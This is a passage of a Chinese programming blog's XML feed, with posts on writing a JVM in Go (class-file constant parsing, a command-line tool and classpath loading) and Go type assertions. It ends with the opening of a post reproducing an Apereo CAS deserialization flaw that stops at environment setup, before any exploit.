self.getConstantInfo(index).(*ConstantClassInfo)   return self.getUtf8(classinfo.nameIndex)  &#125;    </code></pre><p>上面的这些函数都比较简单就不一一说明了，值得一提的是</p><blockquote><p>self.getConstantInfo(index).(*ConstantUtf8Info) </p></blockquote><p>如上的语句上将获取到的结构题转换为ConstantUtf8Info的结构体。</p><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><h4 id="CONSTANT-Interger-info、CONSTANT-Float-info、CONSTANT-Long-info、ConstantDoubleInfo"><a href="#CONSTANT-Interger-info、CONSTANT-Float-info、CONSTANT-Long-info、ConstantDoubleInfo" class="headerlink" title="CONSTANT_Interger_info、CONSTANT_Float_info、CONSTANT_Long_info、ConstantDoubleInfo"></a>CONSTANT_Interger_info、CONSTANT_Float_info、CONSTANT_Long_info、ConstantDoubleInfo</h4><p>CONSTANT_Interger_info用4字节存储整数型常量，结构如下：</p><pre><code>        CONSTANT_Interger_info&#123;            u1 tag;            u4 bytes;    &#125;</code></pre><p>CONSTANT_Float_info使用4字节存储IEEE754单精度浮点数常量，结构如下：</p><pre><code>CONSTANT_Float_info&#123;        u1 tag;        u4 bytes;    &#125;    </code></pre><p>还要CONSTANT_Long_info使用8字节存储整数常量</p><pre><code>CONSTANT_Long_info&#123;        u1 tag;        u4 high_bytes;        u4 low_bytes;    &#125;</code></pre><p>可以看见这三个变量的结构都很相似，因此放在同一文件下，创建cp_numeric.go</p><pre><code class="go">type ConstantIntegerInfo struct &#123;   val int32  &#125;  func (self *ConstantIntegerInfo)readInfo(cr *ClassReader)  &#123;   bytes := cr.readUint32()   self.val =int32(bytes)  &#125;  func (self *ConstantIntegerInfo) Value() int32 &#123;   return self.val  &#125;type ConstantFloatInfo struct &#123;   val float32  &#125;  func (self *ConstantFloatInfo)readInfo(cr *ClassReader)&#123;   bytes := cr.readUint32()   self.val = float32(bytes)  &#125;  func (self *ConstantFloatInfo)Value()float32&#123;   return self.val  &#125;type ConstantLongInfo struct &#123;   val int64  &#125;  func (self *ConstantLongInfo)readInfo(cr *ClassReader)&#123;   bytes := cr.readUint64()   self.val = int64(bytes)  &#125;  func (self *ConstantLongInfo)Value() int64 &#123;   return self.val  &#125;type ConstantDoubleInfo struct &#123;   val float64  &#125;  func (self *ConstantDoubleInfo)readInfo(cr *ClassReader)&#123;   bytes := cr.readUint64()   self.val = float64(bytes)  &#125;  func (self *ConstantDoubleInfo)Value() float64&#123;   return self.val  &#125;</code></pre><h3 id="CONSTANT-Utf8-info"><a href="#CONSTANT-Utf8-info" class="headerlink" title="CONSTANT_Utf8_info"></a>CONSTANT_Utf8_info</h3><p>在class文件中并没有使用UTF-8编码而是使用了MUTF-8编码，</p><pre><code>MUTF-8（Modified UTF-8）编码，可以认为是对UTF-16编码的再编码。它的编码方式与UTF-8编码非常相似，只需要记住某些不同的情况，其他都与UTF-8编码一致。 具体的不同情况有二：        1. 对于Unicode的0码点，UTF-8直接使用1个字节去存储（0000 0000），而MUTF-8会使用2个字节去存储，最后存储的值为0xC080（1100 0000 1000 0000）。        2. 对于0x10000-0x10FFFF这块区域的Unicode码，之前提过UTF-8是使用4个字节去存储，而MUTF-8是对UTF-16的再编码，所以**MUTF-8是对UTF-16编码的两个字符分别用3个字节去编码（因为这段区域的Unicode码值转为UTF-16编码后前导代理和后导代理的范围是0xD800—0xDFFF，明显大于0x0800），共需要6个字节**。</code></pre><p>下面是解析mutf-8的函数：</p><pre><code class="go"> func decodeMUTF8(bytearr []byte) string &#123;   utflen := len(bytearr)   chararr := make([]uint16, utflen)   var c, char2, char3 uint16   count := 0   chararr_count := 0   for count &lt; utflen &#123;   c = uint16(bytearr[count])   if c &gt; 127 &#123;   break   &#125;   count++   chararr[chararr_count] = c        chararr_count++   &#125;   for count &lt; utflen &#123;   c = uint16(bytearr[count])   switch c &gt;&gt; 4 &#123;   case 0, 1, 2, 3, 4, 5, 6, 7:           /* 0xxxxxxx*/   count++   chararr[chararr_count] = c           chararr_count++   case 12, 13:           /* 110x xxxx   10xx xxxx*/   count += 2   if count &gt; utflen &#123;   panic(&quot;malformed input: partial character at end&quot;)   &#125; char2 = uint16(bytearr[count-1])   if char2&amp;0xC0 != 0x80 &#123;   panic(fmt.Errorf(&quot;malformed input around byte %v&quot;, count))   &#125; chararr[chararr_count] = c&amp;0x1F&lt;&lt;6 | char2&amp;0x3F   chararr_count++   case 14:           /* 1110 xxxx  10xx xxxx  10xx xxxx*/   count += 3   if count &gt; utflen &#123;   panic(&quot;malformed input: partial character at end&quot;)   &#125; char2 = uint16(bytearr[count-2])   char3 = uint16(bytearr[count-1])   if char2&amp;0xC0 != 0x80 || char3&amp;0xC0 != 0x80 &#123;   panic(fmt.Errorf(&quot;malformed input around byte %v&quot;, (count - 1)))   &#125; chararr[chararr_count] = c&amp;0x0F&lt;&lt;12 | char2&amp;0x3F&lt;&lt;6 | char3&amp;0x3F&lt;&lt;0   chararr_count++   default:           /* 10xx xxxx,  1111 xxxx */   panic(fmt.Errorf(&quot;malformed input around byte %v&quot;, count))   &#125; &#125; // The number of chars produced may be less than utflen   chararr = chararr[0:chararr_count]   runes := utf16.Decode(chararr)   return string(runes)  &#125;</code></pre><h3 id="CONSTANT-String-info"><a href="#CONSTANT-String-info" class="headerlink" title="CONSTANT_String_info"></a>CONSTANT_String_info</h3><p>该常量点结构如下：</p><pre><code>CONSTANT_String_info&#123;    u1 tag;    u2 string_index;&#125;    </code></pre><p>在如上结构中，可以看见有一个标识常量的tag值，然后一个常量池的索引,所以下面的代码直接通过索引获取到常量池中对应常量的值。</p><pre><code class="go">type ConstantStringInfo struct &#123;   cp ConstantPool   stringIndex uint16  &#125;  func (self *ConstantStringInfo) readInfo(reader *ClassReader)&#123;   self.stringIndex = reader.readUint16()  &#125;  func (self *ConstantStringInfo) String() string&#123;   return self.cp.getUtf8(self.stringIndex)  &#125;    </code></pre><p>同理CONSTANT_Class_info、CONSTANT_NameAndType_info也是如此</p><h3 id="CONSTANT-Fieldref-info、CONSTATNT-Methodref-info、CONSTANT-InterfaceMethodref-info"><a href="#CONSTANT-Fieldref-info、CONSTATNT-Methodref-info、CONSTANT-InterfaceMethodref-info" class="headerlink" title="CONSTANT_Fieldref_info、CONSTATNT_Methodref_info、CONSTANT_InterfaceMethodref_info"></a>CONSTANT_Fieldref_info、CONSTATNT_Methodref_info、CONSTANT_InterfaceMethodref_info</h3><p>fieldref表示字段符号引用，methodref表示普通方法符号引用，interfacemethodref表示接口方法符号引用，这三个常量结构一模一样。</p><pre><code class="go">type ConstantMemberrefInfo struct &#123;   cp                 ConstantPool   classIndex           uint16   nameAndTypeIndex   uint16  &#125;  func (self *ConstantMemberrefInfo) readInfo(reader *ClassReader)&#123;   self.classIndex = reader.readUint16()   self.nameAndTypeIndex = reader.readUint16()  &#125;  func (self *ConstantMemberrefInfo) ClassName() string &#123;   return self.cp.getClassName(self.classIndex)  &#125;  func (self *ConstantMemberrefInfo) NameAndDescriptor()(string, string)&#123;   return self.cp.getNameAndType(self.nameAndTypeIndex)  &#125;  type ConstantFieldrefInfo struct &#123;   ConstantMemberrefInfo  &#125;  type ConstantMethodrefInfo struct &#123;   ConstantMemberrefInfo  &#125;  type ConstantInterfaceMethodrefInfo struct &#123;   ConstantMemberrefInfo  &#125;</code></pre><p>和上面的方法差不多，还有其他的几个常量也是类似就不一一说了。</p><h2 id="字段和方法表-1"><a href="#字段和方法表-1" class="headerlink" title="字段和方法表"></a>字段和方法表</h2><p>字段表在存储字段和方法信息，这里如果忘记class文件的字节顺序的可以看前文。字段、方法表结构类似，差别仅在属性表，同时两表也有类访问标志，访问标志之后是一个常量池索引，给出字段名和方法名，然后又是一个常量池索引，指向字段和方法的描述符。在classfile目录下创建member_info.go代码</p><pre><code>field_info &#123;       u2             access_flags;     u2             name_index;    u2             descriptor_index;    u2             attributes_count;     attribute_info attributes[attributes_count];&#125;method_info &#123;       u2             access_flags;     u2             name_index;     u2             descriptor_index;    u2             attributes_count;     attribute_info attributes[attributes_count];&#125;</code></pre><pre><code class="go">type MemberInfo struct &#123;   cp              ConstantPool   accessFlags     uint16   nameIndex       uint16   descriptorIndex uint16   attributes      []AttributeInfo  &#125;  // read field or method table  func readMembers(reader *ClassReader, cp ConstantPool) []*MemberInfo &#123;   memberCount := reader.readUint16()   members := make([]*MemberInfo, memberCount)   for i := range members &#123;   members[i] = readMember(reader, cp)   &#125; return members  &#125;  func readMember(reader *ClassReader, cp ConstantPool) *MemberInfo &#123;   return &amp;MemberInfo&#123;   cp:              cp,        accessFlags:     reader.readUint16(),        nameIndex:       reader.readUint16(),        descriptorIndex: reader.readUint16(),        attributes:      readAttributes(reader, cp),     &#125;  &#125;</code></pre><h1 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h1><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gweiz505itj31bg0g0tau.jpg" alt=""></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最近的事情比较多，和去年比起来学习进度也比较慢，不过值得庆幸的是，这几个月也拿了两个省二和一个国三，希望在接下来时间中能够坚持学习。在学习大佬的代码中，也学习了很多go的方法和Java的基础知识。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《自己动手写Java虚拟机》</p>]]></content>
    
    <summary type="html">
    
      手撸一个JVM虚拟机--class文件解析
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>接口断言：接口类型判断</title>
    <link href="http://yoursite.com/2021/11/01/%E6%8E%A5%E5%8F%A3%E6%96%AD%E8%A8%80%EF%BC%9A%E6%8E%A5%E5%8F%A3%E7%B1%BB%E5%9E%8B%E5%88%A4%E6%96%AD/"/>
    <id>http://yoursite.com/2021/11/01/%E6%8E%A5%E5%8F%A3%E6%96%AD%E8%A8%80%EF%BC%9A%E6%8E%A5%E5%8F%A3%E7%B1%BB%E5%9E%8B%E5%88%A4%E6%96%AD/</id>
    <published>2021-11-01T03:23:01.000Z</published>
    <updated>2021-11-14T03:24:39.588Z</updated>
    
    <content type="html"><![CDATA[<p>一个接口类型的变量varI通常含有很多种类型多变量，我们需要一种方式来获取到接口到动态类型。即在程序运行阶段，堆栈变量中存储的真实的变量类型。类型断言即可判断接口的动态类型.</p><pre><code>v := varI(T)</code></pre><p>在此之中varI必须为接口，否则编译器会报错。</p><p>在一段代码中我尝试直接用if和==的方式来确定接口当前的类型，但是编译器直接就爆红了，编写的代码如下：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1644302/1635919350202-acb78c15-be0e-464a-9d9a-da384f6932bb.png" alt=""></p><p>报错回显是：<strong>use of .(type) outside of type switch</strong></p><p>有时候类型断言也是无效的，所以通常会采用另外一种安全的写法去书写类型断言</p><p>if v, ok := varI.(T); ok {<br>    Process(v)<br>    return<br>}</p><p>示例代码：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1644302/1635920983989-efa92ba6-c970-4400-a5b5-c09f450f63cd.png" alt=""></p><p>同时也有另外一种方式来判断<strong>type-switch</strong>，示例代码如下：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1644302/1635919466037-567d0f50-19b7-4205-bc3e-c6865db4b663.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      接口断言：接口类型判断
    
    </summary>
    
    
      <category term="go" scheme="http://yoursite.com/categories/go/"/>
    
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
      <category term="go" scheme="http://yoursite.com/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>手撸一个JVM虚拟机--命令行工具</title>
    <link href="http://yoursite.com/2021/10/14/%E6%89%8B%E6%92%B8%E4%B8%80%E4%B8%AAJVM%E8%99%9A%E6%8B%9F%E6%9C%BA--%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7/"/>
    <id>http://yoursite.com/2021/10/14/%E6%89%8B%E6%92%B8%E4%B8%80%E4%B8%AAJVM%E8%99%9A%E6%8B%9F%E6%9C%BA--%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%B7%A5%E5%85%B7/</id>
    <published>2021-10-14T08:23:01.000Z</published>
    <updated>2021-10-14T10:10:33.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="手撸一个JVM虚拟机–命令行工具"><a href="#手撸一个JVM虚拟机–命令行工具" class="headerlink" title="手撸一个JVM虚拟机–命令行工具"></a>手撸一个JVM虚拟机–命令行工具</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>转眼就十月份了，最近都没有好好学习，暑假去安恒实习学到了很多，第一次自己尝试使用go和Java写工具，不过也感觉到了自己在一些基础知识上的薄弱，所以这里打算自己尝试使用go写一个Java虚拟机，希望能坚持写完。</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ul><li>Goland 2021.2</li><li>go version go1.16 darwin/arm64</li></ul><p>首先在%GOPATH%\src目录下创建一个gojvm目录，在目录下创建ch01目录，工作空间的目录结构如下：</p><pre><code>/Users/xiaotan/go/src  |-gojvm    |-ch01</code></pre><h2 id="Java-工作原理"><a href="#Java-工作原理" class="headerlink" title="Java 工作原理"></a>Java 工作原理</h2><p>JVM虚拟机的工作原理就是运行Java应用程序，而main函数则是Java应用程序的入口点，这个类可以用来启动Java应用程序，我们把这个类称为主类。而对于Java虚拟机并没有明确规定如何寻找类来启动应用程序，也就是说由Java虚拟机自行决定，例如Oracle的Java虚拟机实现是通过java命令来启动的，主类名由命令行参数指定。Java命令有如下四种形式：</p><pre><code>java [-options] class [args]java [-options] -jar jarfile [args]javaw [-options] class [args]javaw [-options] -jar jarfile [args]</code></pre><p>第一个非选项参数给出主类的完全限定名（fully qualified name）。但是如果用户提供了-jar选项，则第一个非选项参数表示JAR文件名，java命令必须从这个JAR文件中寻找主类。javaw命令和java命令几乎一样，唯一的差别在于，javaw命令不显示命令行窗口，因此特别适合于启动GUI应用程序。</p><table><thead><tr><th align="center">选项</th><th align="center">用途</th></tr></thead><tbody><tr><td align="center">–version</td><td align="center">输出版本信息然后退出</td></tr><tr><td align="center">-？/-help</td><td align="center">输出帮助信息，然后退出</td></tr><tr><td align="center">-cp/-classpath</td><td align="center">指定用户类路径</td></tr><tr><td align="center">-Dproperty=vlaue</td><td align="center">指定Java系统属性</td></tr><tr><td align="center">-Xms<size></td><td align="center">设置初始堆空间大小</td></tr><tr><td align="center">-Xmx<size></td><td align="center">设置最大堆空间大小</td></tr><tr><td align="center">-Xss<size></td><td align="center">设置线程栈空间大小</td></tr></tbody></table><h2 id="编写命令行工具"><a href="#编写命令行工具" class="headerlink" title="编写命令行工具"></a>编写命令行工具</h2><p>在ch01下创建一个cmd.go文件</p><pre><code class="go">package mainimport (    &quot;flag&quot;    &quot;fmt&quot;    &quot;os&quot;)type CMD struct &#123;    helpFlag bool    versionFlag bool    cpOption string    class string    args []string&#125;func parseCmd() *CMD&#123;    cmd := &amp;CMD&#123;&#125;    flag.Usage = printUsage    flag.BoolVar(&amp;cmd.helpFlag, &quot;help&quot;, false, &quot;print help message&quot;)    flag.BoolVar(&amp;cmd.helpFlag, &quot;?&quot;, false, &quot;print help message&quot;)    flag.BoolVar(&amp;cmd.versionFlag, &quot;version&quot;, false, &quot;print the version&quot;)    flag.StringVar(&amp;cmd.cpOption, &quot;classpath&quot;, &quot;&quot;, &quot;classpath&quot;)    flag.StringVar(&amp;cmd.cpOption, &quot;cp&quot;, &quot;&quot;, &quot;classpath&quot;)    flag.Parse()    args := flag.Args()    if len(args) &gt; 0&#123;        cmd.class = args[0]        cmd.args = args[1:]    &#125;    return cmd&#125;func printUsage()&#123;    fmt.Printf(&quot;Usage: %s [-options] class [args......]\n&quot;, os.Args[0])&#125;</code></pre><p>这里应用了go的内置包flag，通过不同的参数，调用不同的函数。这里先将printUsage()传给flag.Usage然后进行解析，如果解析失败则调用printUsage()函数。</p><p>再创建一个main.go</p><pre><code class="go">package mainimport &quot;fmt&quot;func main()&#123;    cmd := parseCmd()    if cmd.versionFlag&#123;        fmt.Println(&quot;1.0.0&quot;)    &#125;else if cmd.helpFlag || cmd.class == &quot;&quot;&#123;        printUsage()    &#125;else&#123;        startJVM(cmd)    &#125;&#125;func startJVM(cmd *CMD)&#123;    fmt.Printf(&quot;classpath: %s class %s args: %v\n&quot;, cmd.cpOption, cmd.class, cmd.args)&#125;</code></pre><h2 id="搜索class文件"><a href="#搜索class文件" class="headerlink" title="搜索class文件"></a>搜索class文件</h2><h3 id="加载类文件的流程"><a href="#加载类文件的流程" class="headerlink" title="加载类文件的流程"></a>加载类文件的流程</h3><p>下面是一个Java的hello world代码</p><pre><code class="java">public class HelloWorld&#123;    public static void main(String[] args)&#123;        System.out.println(&quot;Hello, world! &quot;);    &#125;&#125;</code></pre><p>加载HelloWorld类之前，首先要加载它的超类，也就是java.lang.Object。在调用main()方法之前，因此虚拟机需要准备好参数数组，所以需要加载java.lang.String和java.lang.String[]类。把字节符打印到控制台还需要加载java.lang.System类等等。</p><h3 id="类路径加载"><a href="#类路径加载" class="headerlink" title="类路径加载"></a>类路径加载</h3><p>   Java虚拟机规范并没有规定虚拟机应该从哪里寻找类，因此不同的虚拟机实现可以采用不同的方法。Oracle的Java虚拟机实现根据类路径（class path）来搜索类。会先后搜索启动类路径（bootstrap classpath），拓展类路径（extension classpath），用户类（user classpath）。启动类路径默认对应jre\lib目录，Java标准库（大部分在rt.jar里）位于该路径。拓展类路径默认对应jre\lib\ext目录，使用Java拓展机制的类位于这个路径。我们自己实现的类，以及第三方类库则位于用户类路径。可以通过- Xbootclasspath选项修改启动类路径，不过通常并不需要这样做，所以这里就不详细介绍。</p><p>用户类的默认值是当前目录及”.”。可以修改CLASSPATH环境变量来修改用户类路径，但是这样不够灵活，所以不推荐使用。更好的办法是给java命令传递-classpath。</p><h3 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h3><p>将ch01复制一份重命名为ch02，并在目录中创建classpath文件夹。<br>我们的Java虚拟机将使用JDK的启动类路径寻找和加载Java标准库中的类，所以需要中ch02/cmd.go中添加一个参数XjreOption来获得jre路径。</p><pre><code class="go">type CMD struct &#123;    helpFlag bool    versionFlag bool    cpOption string    XjreOption string    class string    args []string&#125;func parseCmd() *CMD&#123;    cmd := &amp;CMD&#123;&#125;    flag.Usage = printUsage    flag.BoolVar(&amp;cmd.helpFlag, &quot;help&quot;, false, &quot;print help message&quot;)    flag.BoolVar(&amp;cmd.helpFlag, &quot;?&quot;, false, &quot;print help message&quot;)    flag.BoolVar(&amp;cmd.versionFlag, &quot;version&quot;, false, &quot;print the version&quot;)    flag.StringVar(&amp;cmd.cpOption, &quot;classpath&quot;, &quot;&quot;, &quot;classpath&quot;)    flag.StringVar(&amp;cmd.cpOption, &quot;cp&quot;, &quot;&quot;, &quot;classpath&quot;)    flag.StringVar(&amp;cmd.XjreOption, &quot;Xjre&quot;, &quot;&quot;, &quot;path to jre&quot;)    flag.Parse()    args := flag.Args()    if len(args) &gt; 0&#123;        cmd.class = args[0]        cmd.args = args[1:]    &#125;    return cmd&#125;</code></pre><h4 id="Entry接口"><a href="#Entry接口" class="headerlink" title="Entry接口"></a>Entry接口</h4><p>在classpath目录下创建entry.go</p><pre><code class="go">package classpathimport (    &quot;os&quot;    &quot;strings&quot;)const pathListSeparator = string(os.PathListSeparator)//存放路径分隔符type Entry interface &#123;    readClass(className string)([]byte, Entry, error)    String() string&#125;func newEntry(path string) Entry&#123;    if strings.Contains(path, pathListSeparator)&#123;        return newCompositeEntry(path)    &#125;    //判断是否是*结尾    if strings.HasSuffix(path, &quot;*&quot;)&#123;        return newWildcardEntry(path)    &#125;    if strings.HasSuffix(path, &quot;.jar&quot;) ||         strings.HasSuffix(path, &quot;.JAR&quot;) ||         strings.HasSuffix(path, &quot;.zip&quot;) ||        strings.HasSuffix(path, &quot;.ZIP&quot;)&#123;        return newZipEntry(path)    &#125;    return newDirEntry(path)&#125;</code></pre><p>定义常量pathListSeparator表示路径分隔符，定义一个接口Entry其中包含readClass方法和String方法，String类似于Java的toString方法，用来打印。</p><h5 id="DirEntry"><a href="#DirEntry" class="headerlink" title="DirEntry"></a>DirEntry</h5><p>在相同目录下创建entry_dir.go，DirEntry用来存放绝对路径。</p><pre><code class="go">package classpathimport (    &quot;io/ioutil&quot;    &quot;path/filepath&quot;)type DirEntry struct &#123;    absDir string&#125;func (self *DirEntry) String() string &#123;    return self.absDir&#125;func newDirEntry(path string) *DirEntry&#123;    absDir, err := filepath.Abs(path)    if err != nil &#123;        panic(err)    &#125;    return &amp;DirEntry&#123;absDir&#125;&#125;func (self *DirEntry) readClass(className string)([]byte, Entry, error)&#123;    fileName := filepath.Join(self.absDir, className)    data, err := ioutil.ReadFile(fileName)    return data, self, err&#125;</code></pre><h5 id="ZipEntry"><a href="#ZipEntry" class="headerlink" title="ZipEntry"></a>ZipEntry</h5><p>ZipEntry表示ZIP和JAR文件的类路径因为寻找一次类文件关闭一次会导致效率降低因此在结构体中增加一个zipRC</p><pre><code class="go">package classpathimport (    &quot;archive/zip&quot;    &quot;errors&quot;    &quot;io/ioutil&quot;    &quot;path/filepath&quot;)type ZipEntry struct &#123;    absPath string    zipRC   *zip.ReadCloser&#125;func newZipEntry(path string) *ZipEntry &#123;    absPath, err := filepath.Abs(path)    if err != nil &#123;        panic(err)    &#125;    return &amp;ZipEntry&#123;absPath, nil&#125;&#125;func (self *ZipEntry) readClass(className string) ([]byte, Entry, error) &#123;    if self.zipRC == nil &#123;        err := self.openJar()        if err != nil &#123;            return nil, nil, err        &#125;    &#125;    classFile := self.findClass(className)    if classFile == nil &#123;        return nil, nil, errors.New(&quot;class not found: &quot; + className)    &#125;    data, err := readClass(classFile)    return data, self, err&#125;// todo: close zipfunc (self *ZipEntry) openJar() error &#123;    r, err := zip.OpenReader(self.absPath)    if err == nil &#123;        self.zipRC = r    &#125;    return err&#125;func (self *ZipEntry) findClass(className string) *zip.File &#123;    for _, f := range self.zipRC.File &#123;        if f.Name == className &#123;            return f        &#125;    &#125;    return nil&#125;func readClass(classFile *zip.File) ([]byte, error) &#123;    rc, err := classFile.Open()    if err != nil &#123;        return nil, err    &#125;    // read class data    data, err := ioutil.ReadAll(rc)    rc.Close()    if err != nil &#123;        return nil, err    &#125;    return data, nil&#125;func (self *ZipEntry) String() string &#123;    return self.absPath&#125;</code></pre><h5 id="CompositeEntry"><a href="#CompositeEntry" class="headerlink" title="CompositeEntry"></a>CompositeEntry</h5><pre><code class="go">package classpathimport (    &quot;errors&quot;    &quot;strings&quot;)type CompositeEntry []Entryfunc newCompositeEntry(pathList string) CompositeEntry&#123;    compositeEntry := []Entry&#123;&#125;    for _, path := range strings.Split(pathList,        pathListSeparator)&#123;        entry := newEntry(path)        compositeEntry = append(compositeEntry, entry)    &#125;    return compositeEntry&#125;func (self CompositeEntry) readClass(className string)([]byte, Entry, error)&#123;    for _, entry := range self &#123;        data, from, err := entry.readClass(className)        if err == nil&#123;            return data, from, nil        &#125;    &#125;    return nil, nil, errors.New(&quot;class not found: &quot; +        className)&#125;func (self CompositeEntry) String() string&#123;    strs := make([]string, len(self))    for i, entry := range self&#123;        strs[i] = entry.String()    &#125;    return strings.Join(strs, pathListSeparator)&#125;</code></pre><h5 id="WildcardEntry"><a href="#WildcardEntry" class="headerlink" title="WildcardEntry"></a>WildcardEntry</h5><p>本质上WildcardEntry也是CompositeEntry，调用Walk函数编列aseDir创建ZIP实体。这里用到了函数式编程。</p><pre><code class="go">package classpathimport (    &quot;os&quot;    &quot;path/filepath&quot;    &quot;strings&quot;)func newWildcardEntry(path string) CompositeEntry&#123;    baseDir := path[:len(path) - 1] //去除 *    compositeEntry := []Entry&#123;&#125;    walkFn := func(path string, info os.FileInfo, err error) error&#123;        if err != nil &#123;            return err        &#125;        if info.IsDir() &amp;&amp; path != baseDir&#123;            return filepath.SkipDir        &#125;        if strings.HasSuffix(path, &quot;.jar&quot;) ||    strings.HasSuffix(path, &quot;.JAR&quot;)&#123;            jarEntry := newZipEntry(path)            compositeEntry = append(compositeEntry, jarEntry)        &#125;        return nil    &#125;    filepath.Walk(baseDir, walkFn)    return compositeEntry&#125;</code></pre><p>优先使用用户输入-Xjre选项作为jre目录。如果没有输入该选项，则中当前目录下寻找jre目录。如果找不到，尝试使用JAVA_HOME。<br>classpath.go</p><pre><code class="go">package classpathimport (    &quot;os&quot;    &quot;path/filepath&quot;)type Classpath struct&#123;    bootClasspath Entry    extClasspath Entry    userClasspath Entry&#125;func Parse(jreOption, cpOption string) *Classpath&#123;    cp := &amp;Classpath&#123;&#125;    cp.parseBootAndExtClasspath(jreOption)    cp.parseUserClasspath(cpOption)    return cp&#125;func (self *Classpath) parseBootAndExtClasspath(jreOption string)&#123;    jreDir := getJreDir(jreOption)    // jre/lib/*    jreLibPath := filepath.Join(jreDir, &quot;lib&quot;, &quot;*&quot;)    self.bootClasspath = newWildcardEntry(jreLibPath)    // jre/lib/ext/*    jreExtPAth := filepath.Join(jreDir, &quot;lib&quot;, &quot;ext&quot;, &quot;*&quot;)    self.extClasspath = newWildcardEntry(jreExtPAth)&#125;func getJreDir(jreOption string) string&#123;    if jreOption != &quot;&quot; &amp;&amp; exists(jreOption)&#123;        return jreOption    &#125;    if exists(&quot;./jre&quot;)&#123;        return &quot;./jre&quot;    &#125;    if jh := os.Getenv(&quot;JAVA_HOME&quot;); jh != &quot;&quot; &#123;        return filepath.Join(jh, &quot;jre&quot;)    &#125;    panic(&quot;Can not find jre folder! &quot;)&#125;func exists(path string) bool &#123;    if _, err := os.Stat(path); err != nil&#123;        if os.IsNotExist(err) &#123;            return false        &#125;    &#125;    return true&#125;func (self *Classpath) parseUserClasspath(cpOption string)&#123;    if cpOption == &quot;&quot;&#123;        cpOption = &quot;.&quot;    &#125;    self.userClasspath = newEntry(cpOption)&#125;// 如果用户未提供-cp选项则使用当前目录作为用户路径func (self *Classpath) ReadClass(className string) ([]byte, Entry, error)&#123;    className = className + &quot;.class&quot;    if data, entry, err :=        self.bootClasspath.readClass(className); err == nil &#123;        return data, entry, err    &#125;    if data, entry, err :=        self.extClasspath.readClass(className); err == nil&#123;        return data, entry, err    &#125;    return self.userClasspath.readClass(className)&#125;func (self *Classpath) String() string&#123;    return self.userClasspath.String()&#125;</code></pre><p>然后修改一下StartJVM</p><pre><code class="go">func startJVM(cmd *CMD)&#123;    cp := classpath.Parse(cmd.XjreOption, cmd.cpOption)    fmt.Printf(&quot;classpath: %v class: %v args: %v\n&quot;,        cp, cmd.class, cmd.args)    className := strings.Replace(cmd.class, &quot;.&quot;, &quot;/&quot;, -1)    classData, _, err := cp.ReadClass(className)    if err != nil &#123;        fmt.Printf(&quot;Could not find or load main class %s\n&quot;,            cmd.class)        return    &#125;    fmt.Printf(&quot;class data: %v\n&quot;, classData)&#125;</code></pre><h3 id="结果展示"><a href="#结果展示" class="headerlink" title="结果展示"></a>结果展示</h3><p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gvelors08pj60w20mw43n02.jpg" alt=""></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>《自己动手写Java虚拟机》</p>]]></content>
    
    <summary type="html">
    
      手撸一个JVM虚拟机--命令行工具
    
    </summary>
    
    
      <category term="Java" scheme="http://yoursite.com/categories/Java/"/>
    
    
      <category term="Java" scheme="http://yoursite.com/tags/Java/"/>
    
      <category term="悦读" scheme="http://yoursite.com/tags/%E6%82%A6%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>Apereo Cas 4.1.X 反序列化漏洞复现</title>
    <link href="http://yoursite.com/2021/09/15/Apereo%20Cas%204.1.X%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2021/09/15/Apereo%20Cas%204.1.X%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-09-15T08:23:01.000Z</published>
    <updated>2021-09-15T08:25:56.715Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Apereo-Cas-4-1-X-反序列化漏洞复现"><a href="#Apereo-Cas-4-1-X-反序列化漏洞复现" class="headerlink" title="Apereo Cas 4.1.X 反序列化漏洞复现"></a>Apereo Cas 4.1.X 反序列化漏洞复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个漏洞挺简单的就简单的跟一下利用链，并没有什么东西。最近沉迷永劫无间，没有好好学习呜呜。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>IDEA 2021<br>CAS Server Webapp » 4.1.1<br>tomcat 7<br><a href="https://mvnrepository.com/artifact/org.jasig.cas/cas-server-webapp/4.1.1">下载地址</a><br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucr9v3k2rj619t0u0tdq02.jpg" alt=""></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>部署完成后就是如下的页面<br><img src="https://tva1.sinaimg.cn/large/008i3skNly1gucraqg9hej61900u0dkp02.jpg" alt=""><br>在org.springframework.web.servlet.FrameworkServlet#doPost下断点，因为登陆发送的是Post包跟入<br>org.springframework.web.servlet.DispatcherServlet#doService，doDispatch对request、response进行处理<br><img 